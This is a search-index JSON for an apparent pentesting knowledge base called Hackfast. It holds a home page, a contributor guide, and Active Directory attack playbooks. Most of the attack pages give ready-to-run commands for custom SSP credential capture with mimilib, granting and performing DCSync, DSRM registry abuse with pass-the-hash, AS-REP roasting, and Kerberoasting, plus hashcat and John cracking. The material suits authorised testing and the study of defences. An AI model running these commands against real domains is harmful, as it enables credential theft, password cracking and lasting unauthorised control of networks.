{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":"<p>Hackfast is a platform built so pentesters can focus entirely on hacking not on digging through endless resources. It brings everything together in one place: practical techniques, ready-to-use commands, step-by-step playbooks, checklists, and real-world examples. Beyond technical skills, Hackfast delivers productivity strategies and the hacker mindset to sharpen your workflow and decision-making. Whether you\u2019re starting out or advancing your skills, Hackfast equips you with the knowledge, tools, and approach to move faster and stay ahead</p> Legal Disclaimer <p>Hackfast is intended for educational and informational purposes only. All material is provided \u201cas-is\u201d without any warranty express or implied regarding its completeness, accuracy, reliability, or suitability for any purpose. You use this information entirely at your own risk. The authors and publishers shall under no circumstances be liable for direct, indirect, incidental, consequential, or any other form of loss or damage including loss of data, profit, or business arising from, or in connection with, your use of this guide. Any techniques, commands, or methodologies described herein are presented only to illustrate security concepts. They must never be applied to systems you do not own or lack explicit written permission to test. The authors and publishers do not condone or encourage illegal or unethical activity. You are fully responsible for verifying legality, obtaining proper authorization, and seeking professional guidance before acting on any content in this base. By continuing to read, you irrevocably agree to hold the authors and publishers harmless for any consequences resulting from your use or misuse of the information provided.</p> HackFast Values <p>Organized and Searchable: Content is structured, tagged, and regularly updated so you can quickly find the right payload, script, or technique when you need it.  Free &amp; Open: Knowledge wants to be free. HackFast will always be accessible at zero cost and licensed for remixing, translating, and sharing.  Ethical responsibility: All content is provided for educational and lawful purposes. We advocate for ethical hacking practices and responsible disclosure at all times. Constant evolution: Security never stands still. We constantly review and update content to keep up with new exploits, tools, and techniques.</p> Contributing <p>If you want to contribute, check out our contribution guide.</p>"},{"location":"Community/Contributing/","title":"How to become a Contributor","text":""},{"location":"Community/Contributing/#pull-requests","title":"PULL REQUESTS","text":"<p>You can contribute to HackFast by making a pull request that will be reviewed by maintainers and integrated into the main repository when the changes made are approved. You can contribute changes to the documentation, Expand an existing section or add a new technique, tool or cheat-sheet.</p>"},{"location":"Community/Contributing/#learning-about-pull-requests","title":"LEARNING ABOUT PULL REQUESTS","text":"<p>Pull requests are a concept layered on top of Git by services that provide Git hosting. Before you consider making a pull request, you should familiarize yourself with the documentation on GitHub, the service we are using. The following articles are of particular importance:</p> <ol> <li>Forking a repository</li> <li>Creating a pull request from a fork</li> <li>Creating a pull request</li> </ol> <p>Note that they provide tailored documentation for different operating systems and different ways of interacting with GitHub. We do our best in the documentation here to describe the process as it applies to HackFast but cannot cover all possible combinations of tools and ways of doing things. It is also important that you understand the concept of a pull-request in general before continuing.</p>"},{"location":"Community/Contributing/#pull-request-process","title":"PULL REQUEST PROCESS","text":"<p>In the following, we describe the general process for making pull requests. </p>"},{"location":"Community/Contributing/#preparing-changes-and-draft-pr","title":"PREPARING CHANGES AND DRAFT PR","text":"<p>The diagram below describes what typically happens to repositories in the process or preparing a pull request. We will be discussing the review-revise process below. It is important that you understand the overall process first before you worry about specific commands. This is why we cover this first before providing instructions below.</p> <pre><code>sequenceDiagram\n  autonumber\n\n  participant HackFast\n  participant PR\n  participant fork\n  participant local\n\n  HackFast -&gt;&gt; fork: fork on GitHub\n  fork -&gt;&gt; local: clone to local\n  local -&gt;&gt; local: branch\n  loop prepare\n    loop push\n      loop edit\n        local -&gt;&gt; local: commit\n      end\n      local -&gt;&gt; fork: push\n    end\n    HackFast -&gt;&gt; fork: merge in any changes\n    fork -&gt;&gt;+ PR: create draft PR\n    PR -&gt;&gt; PR: review your changes\n  end</code></pre> <ol> <li> <p>The first step is that you create a fork of the Hackfast repository HackFast. This provides you with a repository that you can push changes to. Note that it is not possible to have more than one fork of a given repository at any point in time. So, the fork you create will be the fork you have.</p> </li> <li> <p>Once it is made, clone it to your local machine so you can start working on your changes.</p> </li> <li> <p>All contributions should be made through a 'topic branch' with a name that describes the work being done. This allows you to have more than one piece of work in progress and, The topic branch will be relatively short-lived and will disappear at the end, when your changes have been incorporated into the documentation.</p> </li> <li> <p>Next comes the iterative process of making edits, committing them to your clone. Please commit in sensible chunks that constitute a piece of work instead of committing everything in one go. Remember that fine-grained, incremental commits are much easier to review in than large changes all over the place and with many files involved. Try to keep your changes as small and localized as possible and keep the reviewer in mind when committing. In particular, make sure to write meaningful commit messages.</p> </li> <li> <p>Push your work up to your fork regularly.</p> </li> <li> <p>You should also keep an eye on changes in the HackFast repository you cloned. This is especially important if you work takes a while. Please try and merge any concurrent changes into your fork and into your branch regularly. You must do this at least once before creating a pull request, so make your life easier and do it more often so as to minimize the risk of conflicting changes.</p> </li> <li> <p>Once you are happy that your changes are in a state that you can describe them in a draft pull request, you should create this. Make sure to reference any previous discussions or issues that gave rise to your work. Creating a draft is a good way to get early feedback on your work from the maintainer or others. You can explicitly request reviews at points where you think this would be important.</p> </li> <li> <p>Review your work as if you were the reviewer and fix any issues with your work so far.</p> </li> </ol>"},{"location":"Community/Contributing/#finalizing","title":"FINALIZING","text":"<p>Once you are happy with your changes, you can move to the next step, finalizing your pull request and asking for a more formal and detailed review. The diagram below shows the process:</p> <pre><code>sequenceDiagram\n  autonumber\n  participant HackFast\n  participant PR\n  participant fork\n  participant local\n\n  activate PR\n  PR -&gt;&gt; PR : finalize PR\n  loop review\n    loop discuss\n      PR -&gt;&gt; PR: request review\n      PR -&gt;&gt; PR: discussion\n      local -&gt;&gt; fork: push further changes\n    end\n    PR -&gt;&gt; HackFast: merge (and squash)\n    deactivate PR\n    fork -&gt;&gt; fork: delete branch\n    HackFast -&gt;&gt; fork: pull\n    local -&gt;&gt; local: delete branch\n    fork -&gt;&gt; local: pull\n  end</code></pre> <ol> <li> <p>When you are happy that the changes you made amount to a contribution that the maintainer(s) could integrate into the main repository, finalize the pull request. This signals to everyone that consider the work 'done' and that it can be reviewed with a view to accepting and integrating it.</p> </li> <li> <p>The maintainer may make comments, which you should discuss with them. Bear in mind when doing this that the maintainer may have a different point of view compared to yours. Please keep the discussion respectful at all times. </p> </li> <li> <p>Make any requested changes by committing them to your local clone and pushing them up to your fork. This will automatically update the pull request. It may well take a few iterations to get your contributions to an acceptable state. You can help the process along by carefully reading comments made and making changes with care.</p> </li> <li> <p>Once the reviewer is fully satisfied with the changes, they can merge them into the main branch (or 'master'). In the process, they may 'squash' your commits together into a smaller number of commits and may edit the messages that describe them. Congratulations, you have now contributed to this project and should see the changes in the main branch under your name.</p> </li> <li> <p>You can now delete the fork and your local repository and start afresh again next time around. Alternatively, you can keep the repository and local clone around but it is important that you keep them in sync with the upstream repository for any subsequent work. We recommend that you start by deleting the branch you used on your fork.</p> </li> <li> <p>To make sure you have the changes you produced, pull them from the main repository into the main branch of your fork.</p> </li> <li> <p>Similarly, delete the topic branch from your local clone and...</p> </li> <li> <p>pull the changes to its master branch.</p> </li> </ol>"},{"location":"Community/Contributing/#merging-concurrent-changes","title":"MERGING CONCURRENT CHANGES","text":"<p>If the work you do takes some time then the chances increase that changes will be made to the main repository while you work. It is probably a good idea to set up the original HackFast repository as an <code>upstream</code> repository for your local clone.</p> <p>This is what it might look like:</p> <pre><code>$ git remote -v\norigin  git@github.com:&lt;your_username&gt;/HackFast.git (fetch)\norigin  git@github.com:&lt;your_username&gt;/HackFast.git (push)\n$ git remote add upstream https://github.com/hack-fast/HackFast.git\n$ git remote -v\norigin  git@github.com:rikozi/HackFast.git (fetch)\norigin  git@github.com:rikozi/HackFast.git (push)\nupstream    https://github.com/hack-fast/HackFast.git (fetch)\nupstream    https://github.com/hack-fast/HackFast.git (push)\n</code></pre> <p>After you have done this, you can pull any concurrent changes from the upstream repository directly into your clone and do any necessary merges there, then push them up to your fork. You will need to be explicit about which remote repository you want to use when you are doing a <code>pull</code>:</p> <pre><code># making and committing some local changes\npush pull upstream master\n</code></pre> <p>This fetches changes from the <code>master</code> branch into your topic branch and merges them.</p>"},{"location":"Offensive-Security/Active-Directory/readme/","title":"Readme","text":""},{"location":"Offensive-Security/Active-Directory/readme/#introduction","title":"Introduction","text":"<p>Active Directory (AD) is a Microsoft service for Windows domain networks.It provides essential services for managing network resources, user accounts, authentication, and application-specific data.  </p> <p>Core components include:</p> <ul> <li>AD DS (Domain Services) </li> <li>AD LDS (Lightweight Directory Services) </li> <li>AD CS (Certificate Services) </li> <li>AD FS (Federation Services) </li> <li>AD RMS (Rights Management Services) </li> </ul>"},{"location":"Offensive-Security/Active-Directory/readme/#active-directory-structure","title":"Active Directory Structure","text":"<ol> <li>Domains \u2013 Collections of objects (users, groups, devices) sharing a common database  </li> <li>Trees \u2013 Groups of domains connected in a hierarchical structure  </li> <li>Forests \u2013 The top layer, composed of multiple trees interconnected by trust relationships  </li> </ol>"},{"location":"Offensive-Security/Active-Directory/readme/#key-concepts-in-active-directory","title":"Key Concepts in Active Directory","text":"<ol> <li>Directory \u2013 Stores all information about AD objects  </li> <li>Object \u2013 Represents entities such as users, groups, or shared folders  </li> <li>Domain \u2013 A container for directory objects; multiple domains can coexist within a forest  </li> <li>Tree \u2013 A grouping of domains that share a common root domain  </li> <li>Forest \u2013 The highest level in AD, made up of multiple trees with trust relationships  </li> </ol>"},{"location":"Offensive-Security/Active-Directory/readme/#services-provided-by-active-directory-domain-services","title":"Services Provided by Active Directory Domain Services","text":"<ol> <li>Domain Services \u2013 Centralized data storage, authentication, and search functionalities  </li> <li>Certificate Services \u2013 Creation, distribution, and management of digital certificates  </li> <li>Lightweight Directory Services \u2013 Directory-enabled application support via LDAP  </li> <li>Federation Services \u2013 Single sign-on (SSO) across multiple web applications  </li> <li>Rights Management \u2013 Protects copyrighted content by restricting unauthorized distribution  </li> <li>DNS Service \u2013 Critical for resolving domain names  </li> </ol>"},{"location":"Offensive-Security/Active-Directory/readme/#common-active-directory-vulnerabilities","title":"Common Active Directory Vulnerabilities","text":"<ol> <li>Weak Password Policies \u2013 Simple, guessable passwords lacking complexity or length  </li> <li>Unpatched Software and Systems \u2013 Outdated systems exploited via known vulnerabilities  </li> <li>Excessive Privileges \u2013 Over-privileged accounts increase risk if compromised  </li> <li>Inadequate Monitoring and Logging \u2013 Fails to detect suspicious activities or breaches  </li> <li>Lack of Network Segmentation \u2013 Allows attackers to move laterally with ease  </li> <li>Phishing &amp; Social Engineering \u2013 Tricks users into disclosing credentials or installing malware  </li> <li>Misconfigured Service Accounts \u2013 Often over-privileged and high-value targets  </li> <li>Insecure LDAP Bindings \u2013 Unencrypted LDAP traffic can expose credentials to interception  </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Domain-Persistence/Custom-SSP/","title":"Custom SSP","text":""},{"location":"Offensive-Security/Active-Directory/Domain-Persistence/Custom-SSP/#domain-persistence-via-custom-ssp","title":"Domain Persistence via Custom SSP","text":"<p>Custom Security Support Providers (SSPs) can be used to capture plaintext passwords from users who log on. This guide provides steps to set up a custom SSP using a DLL, such as <code>mimilib.dll</code> from Mimikatz.  </p>"},{"location":"Offensive-Security/Active-Directory/Domain-Persistence/Custom-SSP/#steps-to-set-up-a-custom-ssp","title":"Steps to Set Up a Custom SSP","text":"<ol> <li> <p>Get current security packages:     <pre><code>$packages = Get-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\" -Name 'Security Packages' | select -ExpandProperty 'Security Packages'\n</code></pre></p> </li> <li> <p>Append the custom DLL (e.g., mimilib): <pre><code>$packages `= \"mimilib\"\n</code></pre></p> </li> <li> <p>Update the OSConfig registry key with the new packages: <pre><code>Set-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\" -Name 'Security Packages' -Value $packages\n</code></pre></p> </li> <li> <p>Update the Lsa registry key with the new packages: <pre><code>Set-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name 'Security Packages' -Value $packages\n</code></pre></p> </li> <li> <p>Alternative method using Mimikatz to inject mimilib: <pre><code>Invoke-Mimikatz -Command '\"misc::memssp\"'\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Domain-Persistence/DCSync/","title":"DCSync","text":""},{"location":"Offensive-Security/Active-Directory/Domain-Persistence/DCSync/#introduction","title":"Introduction","text":"<p>Granting DCSync privileges allows a user to replicate domain data, which includes sensitive information such as password hashes.  </p>"},{"location":"Offensive-Security/Active-Directory/Domain-Persistence/DCSync/#steps-to-grant-dcsync-privileges","title":"Steps to Grant DCSync Privileges","text":"<ol> <li> <p>Grant DCSync privileges using PowerView: <pre><code>Add-DomainObjectAcl -TargetIdentity \"DC=SUB,DC=DOMAIN,DC=LOCAL\" -PrincipalIdentity bfarmer -Rights DCSync\n</code></pre></p> </li> <li> <p>Perform a DCSync attack with Mimikatz: <pre><code>Invoke-Mimikatz -Command '\"lsadump::dcsync /user:[DOMAINNAME]\\[ANYDOMAINUSER]\"'\n</code></pre></p> </li> <li> <p>Run DCSync using NTLM authentication: <pre><code>secretsdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP_ADDRESS] -just-dc-ntlm\n</code></pre></p> </li> <li> <p>Run secretsdump.py with Kerberos authentication: <pre><code>secretsdump.py -no-pass -k &lt;Domain&gt;/&lt;Username&gt;@&lt;DC_IP_or_FQDN&gt; -just-dc-ntlm\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Domain-Persistence/DSRM-Abuse/","title":"DSRM Abuse","text":""},{"location":"Offensive-Security/Active-Directory/Domain-Persistence/DSRM-Abuse/#overview","title":"Overview","text":"<p>Domain Controllers (DCs) have a local Administrator account that can be leveraged for persistence. By gaining administrative privileges on a DC and dumping the local Administrator hash, you can modify the registry to enable remote access to this account.  </p>"},{"location":"Offensive-Security/Active-Directory/Domain-Persistence/DSRM-Abuse/#procedure-for-enabling-remote-dsrm-account-access","title":"Procedure for Enabling Remote DSRM Account Access","text":"<ol> <li> <p>Dump the hash of the local Administrator account on the DC using Mimikatz: <pre><code>Invoke-Mimikatz -Command '\"token::elevate\" \"lsadump::sam\"'\n</code></pre></p> </li> <li> <p>Modify the registry to enable remote access.    The registry key <code>DsrmAdminLogonBehavior</code> controls whether the Directory Services Restore Mode (DSRM) account can log on remotely: <code>0</code> \u2192 Default (remote login disabled) <code>1</code> \u2192 Allow remote login if explicitly enabled <code>2</code> \u2192 Always allow remote login NOTE: Setting the value to 2 ensures that the DSRM/local Administrator account can be used for remote logins.  </p> </li> <li> <p>Check if the key exists and get its value: <pre><code>Get-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\LSA\" -Name DsrmAdminLogonBehavior\n</code></pre></p> </li> <li> <p>Create the key with value <code>2</code> if it does not exist: <pre><code>New-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\LSA\" -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD\n</code></pre></p> </li> <li> <p>Change the value to <code>2</code> if it exists but is set incorrectly: <pre><code>Set-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\LSA\" -Name DsrmAdminLogonBehavior -Value 2\n</code></pre></p> </li> <li> <p>Perform Pass-the-Hash (PTH) to gain access, use the dumped hash to authenticate and access the DC remotely. Note: the \"domain\" used is the name of the DC machine.  </p> </li> <li> <p>Use <code>sekurlsa::pth</code> to pass the hash: <pre><code>sekurlsa::pth /domain:[DC_MACHINE_NAME] /user:[USERNAME] /ntlm:[HASH] /run:[CMD]\n</code></pre></p> </li> <li> <p>Example \u2014 list the contents of the <code>C$</code> share: <pre><code>ls \\\\[DC_MACHINE_NAME]\\C$\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/ASREPRoasting/From-Linux/","title":"From Linux","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/ASREPRoasting/From-Linux/#using-impacket-getnpuserspy","title":"Using Impacket GetNPUsers.py","text":"<ol> <li> <p>Update the package list: <pre><code>sudo apt-get update\n</code></pre></p> </li> <li> <p>Install Impacket: <pre><code>sudo apt-get install python3-impacket\n</code></pre></p> </li> <li> <p>Enumerate accounts: <pre><code>impacket-GetNPUsers -dc-ip [IP_ADDRESS] example.local/ -usersfile users.txt -no-pass -outputfile asrep_hashes.txt\n</code></pre></p> </li> <li> <p>Crack AS-REP hashes using Hashcat: <pre><code>hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt\n</code></pre></p> </li> <li> <p>Crack AS-REP hashes using John the Ripper: <pre><code>john --format=krb5asrep --wordlist=wordlist.txt asrep_hashes.txt\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/ASREPRoasting/From-Linux/#using-crackmapexec","title":"Using CrackMapExec","text":"<ol> <li>Enumerate accounts and retrieve AS-REP hashes: <pre><code>crackmapexec smb [IP_ADDRESS] -u users.txt --asreproast asrep_hashes.txt\n</code></pre></li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/ASREPRoasting/From-Windows/","title":"From Windows","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/ASREPRoasting/From-Windows/#using-powerview-to-enumerate-accounts","title":"Using PowerView to Enumerate Accounts","text":"<ol> <li> <p>Import the PowerView module: <pre><code>Import-Module .\\PowerView.ps1\n</code></pre></p> </li> <li> <p>Find users with the \"Do not require Kerberos preauthentication\" flag: <pre><code>Get-DomainUser -PreAuthNotRequired\n</code></pre></p> </li> <li> <p>Request AS-REP for targeted users.Once you have identified vulnerable accounts, request the AS-REP.  </p> </li> <li> <p>Download Rubeus from the GitHub releases page: <pre><code>Invoke-WebRequest -Uri \"https://github.com/GhostPack/Rubeus/releases/download/v1.5.0/Rubeus.zip\" -OutFile \"Rubeus.zip\"\n</code></pre></p> </li> <li> <p>Unzip the downloaded file to a directory of your choice: <pre><code>Expand-Archive -Path \"Rubeus.zip\" -DestinationPath \".\\Rubeus\"\n</code></pre></p> </li> <li> <p>Request AS-REP hashes with Rubeus: <pre><code>.\\Rubeus.exe asreproast\n</code></pre></p> </li> <li> <p>Save the AS-REP hashes to a file: <pre><code>asrep_hashes.txt\n</code></pre></p> </li> <li> <p>Crack the AS-REP hashes using Hashcat with a wordlist (e.g., <code>rockyou.txt</code>): <pre><code>hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/ASREPRoasting/readme/","title":"README","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/ASREPRoasting/readme/#overview","title":"Overview","text":"<p>ASREPRoast is an attack that exploits accounts without the Kerberos pre-authentication required attribute.This vulnerability allows an attacker to request authentication data for a user from the Domain Controller (DC) without knowing the user\u2019s password.The DC responds with a message encrypted using a key derived from the user password.The attacker can then attempt to crack this response offline to recover the user\u2019s password.  </p>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/ASREPRoasting/readme/#main-requirements","title":"Main Requirements","text":"<ol> <li> <p>Lack of Kerberos Pre-Authentication    Target accounts must have the \u201cDo not require Kerberos pre-authentication\u201d flag set.  </p> </li> <li> <p>Connection to the Domain Controller (DC)    The attacker needs access to the DC to send authentication requests and receive encrypted responses.  </p> </li> <li> <p>Optional Domain Account    Having a valid domain account allows the attacker to efficiently identify vulnerable users through LDAP queries.    Without such an account, the attacker must rely on guessing or enumerating usernames.  </p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/DCSync/From-Linux/","title":"From Linux","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/DCSync/From-Linux/#using-impacket-secretsdumppy","title":"Using Impacket secretsdump.py","text":"<ol> <li> <p>Update the package list: <pre><code>sudo apt-get update\n</code></pre></p> </li> <li> <p>Install Python3-pip: <pre><code>sudo apt-get install python3-pip\n</code></pre></p> </li> <li> <p>Install Impacket: <pre><code>pip3 install impacket\n</code></pre></p> </li> <li> <p>Extract hashes from the Domain Controller: <pre><code>secretsdump.py -outputfile inlanefreight_hashes -just-dc EXAMPLE/[USERNAME]:[PASSWORD]@[IP_ADDRESS]\n</code></pre></p> </li> <li> <p>Install Hashcat: <pre><code>sudo apt-get install hashcat\n</code></pre></p> </li> <li> <p>Crack NTLM hashes with Hashcat: <pre><code>hashcat -m 1000 -a 0 example_hashes.ntds /usr/share/wordlists/rockyou.txt\n</code></pre> <pre><code>hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/DCSync/From-Windows/","title":"From Windows","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/DCSync/From-Windows/#step-1-define-users-sid-and-check-replication-rights","title":"Step 1. Define User\u2019s SID and Check Replication Rights","text":"<ol> <li> <p>Import the PowerView module: <pre><code>Import-Module PowerView\n</code></pre></p> </li> <li> <p>View the group membership of a user (e.g., <code>adunn</code>): <pre><code>Get-DomainUser -Identity [USERNAME] | select samaccountname, objectsid, memberof, useraccountcontrol | fl\n</code></pre></p> </li> <li> <p>Define the user\u2019s SID (Security Identifier). Replace the placeholder with the actual SID of the user you are investigating: <pre><code>$sid = \"S-1-5-21-1234567890-9876543210-4567891230-5678\"\n</code></pre></p> </li> <li> <p>Check if the user has replication rights for the specified domain: <pre><code>Get-ObjectAcl -Identity \"DC=EXAMPLE,DC=LOCAL\" -ResolveGUIDs |\n    Where-Object { ($_.ObjectAceType -match 'Replication-Get') } |\n    Where-Object { $_.SecurityIdentifier -match $sid } |\n    Select-Object AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/DCSync/From-Windows/#step-2-performing-the-dcsync-attack","title":"Step 2. Performing the DCSync Attack","text":"<ol> <li> <p>Open a PowerShell session as the user with DCSync privileges: <pre><code>runas /netonly /user:EXAMPLE\\[USERNAME] powershell\n</code></pre></p> </li> <li> <p>Run Mimikatz: <pre><code>.\\mimikatz.exe\n</code></pre></p> </li> <li> <p>Enable debug privileges: <pre><code>mimikatz # privilege::debug\n</code></pre></p> </li> <li> <p>Execute DCSync: <pre><code>mimikatz # lsadump::dcsync /domain:EXAMPLE.LOCAL /user:EXAMPLE\\administrator\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/DCSync/From-Windows/#step-3-additional-enumeration","title":"Step 3. Additional Enumeration","text":"<ol> <li> <p>Check if any user accounts have the reversible encryption option enabled: <pre><code>Get-DomainUser -Identity * | \n    ? { $_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*' } | \n    select samaccountname, useraccountcontrol\n</code></pre></p> </li> <li> <p>Enumerate accounts with reversible encryption using <code>Get-ADUser</code>: <pre><code>Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/DCSync/readme/","title":"README","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/DCSync/readme/#overview","title":"Overview","text":"<p>The DCSync attack simulates the behavior of a Domain Controller and requests other Domain Controllers to replicate information using the Directory Replication Service Remote Protocol (MS-DRSR). This is a legitimate and necessary function of Active Directory, which means it cannot be disabled.  </p> <ul> <li> <p>Operational Mechanism:   The DCSync attack works by impersonating a Domain Controller. It requests replication data from other Domain Controllers through MS-DRSR.   Since MS-DRSR is a core function of Active Directory, it cannot be turned off or restricted.  </p> </li> <li> <p>Required Privileges:   Only certain high-privilege groups have the permissions required to perform a DCSync attack. These include:  </p> </li> <li>Domain Admins  </li> <li>Enterprise Admins  </li> <li>Administrators  </li> <li> <p>Domain Controllers  </p> </li> <li> <p>Retrieving Cleartext Passwords:   If account passwords are stored using reversible encryption, Mimikatz can be used to extract these passwords in plaintext. </p> </li> </ul>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Kerberoasting/From-Linux/","title":"From Linux","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Kerberoasting/From-Linux/#step-1-set-up-impacket-tools","title":"Step 1: Set Up Impacket Tools","text":"<ol> <li> <p>Clone the Impacket repository: <pre><code>git clone https://github.com/SecureAuthCorp/impacket.git\n</code></pre></p> </li> <li> <p>Navigate to the Impacket directory: <pre><code>cd impacket\n</code></pre></p> </li> <li> <p>Install Impacket using pip: <pre><code>sudo python3 -m pip install .\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Kerberoasting/From-Linux/#step-2-list-accounts-and-request-tgs-tickets","title":"Step 2: List Accounts and Request TGS Tickets","text":"<ol> <li> <p>List SPN accounts: <pre><code>GetUserSPNs.py -dc-ip [DC-IP] [DOMAIN]/[USERNAME]\n</code></pre></p> </li> <li> <p>Request TGS tickets: <pre><code>GetUserSPNs.py -dc-ip [DC-IP] [DOMAIN]/[USERNAME] -request\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Kerberoasting/From-Linux/#step-3-request-specific-tgs-tickets-and-save-to-file","title":"Step 3: Request Specific TGS Tickets and Save to File","text":"<ol> <li> <p>Request a specific TGS ticket: <pre><code>GetUserSPNs.py -dc-ip [DC-IP] [DOMAIN]/[USERNAME] -request-user [SPN-USERNAME]\n</code></pre></p> </li> <li> <p>Save TGS tickets to a file: <pre><code>GetUserSPNs.py -dc-ip [DC-IP] [DOMAIN]/[USERNAME] -request-user [SPN-USERNAME] -outputfile [OUTPUT-FILE]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Kerberoasting/From-Linux/#step-4-crack-tgs-tickets-and-confirm-access","title":"Step 4: Crack TGS Tickets and Confirm Access","text":"<ol> <li> <p>Crack TGS tickets offline: <pre><code>hashcat -m 13100 [TGS-FILE] /usr/share/wordlists/rockyou.txt\n</code></pre></p> </li> <li> <p>Confirm access with the cracked credentials: <pre><code>crackmapexec smb [DC-IP] -u [USERNAME] -p [PASSWORD]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Kerberoasting/From-Windows/","title":"From Windows","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Kerberoasting/From-Windows/#step-1-preparation-and-spn-enumeration","title":"Step 1: Preparation and SPN Enumeration","text":"<ol> <li> <p>List all Service Principal Names (SPNs) in the domain: <pre><code>setspn.exe -Q */*\n</code></pre></p> </li> <li> <p>Add the .NET Framework class to the PowerShell session: <pre><code>Add-Type -AssemblyName System.IdentityModel\n</code></pre></p> </li> <li> <p>Request a Ticket Granting Service (TGS) ticket for a specific SPN: <pre><code>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-SQL-hackfast.example.local:1433\"\n</code></pre></p> </li> <li> <p>Retrieve all tickets: <pre><code>setspn.exe -T EXAMPLE.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Kerberoasting/From-Windows/#step-2-export-and-prepare-kerberos-tickets","title":"Step 2: Export and Prepare Kerberos Tickets","text":"<ol> <li> <p>Use Mimikatz to list and export Kerberos tickets: <pre><code>mimikatz # kerberos::list /export\n</code></pre></p> </li> <li> <p>Convert tickets to base64 for easier transport: <pre><code>mimikatz # base64 /out:true\n</code></pre></p> </li> <li> <p>Remove new lines and spaces: <pre><code>echo \"[BASE64 BLOB]\" | tr -d \\\\n\n</code></pre></p> </li> <li> <p>Save the blob to a <code>.kirbi</code> file: <pre><code>cat encoded_file | base64 -d &gt; sqldev.kirbi\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Kerberoasting/From-Windows/#step-3-extract-and-crack-the-kerberos-ticket","title":"Step 3: Extract and Crack the Kerberos Ticket","text":"<ol> <li> <p>Extract the Kerberos ticket using <code>kirbi2john.py</code>: <pre><code>python2.7 kirbi2john.py sqldev.kirbi &gt; crack_file\n</code></pre></p> </li> <li> <p>Modify the file for Hashcat: <pre><code>sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file &gt; sqldev_tgs_hashcat\n</code></pre></p> </li> <li> <p>Confirm the prepared hash: <pre><code>cat sqldev_tgs_hashcat\n</code></pre></p> </li> <li> <p>Crack the hash with Hashcat: <pre><code>hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Kerberoasting/From-Windows/#powerview-for-spn-enumeration-and-ticket-extraction","title":"PowerView for SPN Enumeration and Ticket Extraction","text":"<ol> <li> <p>Import PowerView: <pre><code>Import-Module .\\PowerView.ps1\n</code></pre></p> </li> <li> <p>List domain users with SPNs: <pre><code>Get-DomainUser * -spn | select samaccountname\n</code></pre></p> </li> <li> <p>Get SPN tickets for a specific user and format for Hashcat: <pre><code>Get-DomainUser -Identity [USERNAME] | Get-DomainSPNTicket -Format Hashcat\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Kerberoasting/From-Windows/#rubeus-for-advanced-kerberoasting-techniques","title":"Rubeus for Advanced Kerberoasting Techniques","text":"<ol> <li> <p>Perform Kerberoasting and output hashes to a file: <pre><code>.\\Rubeus.exe kerberoast /outfile:hashes.txt\n</code></pre></p> </li> <li> 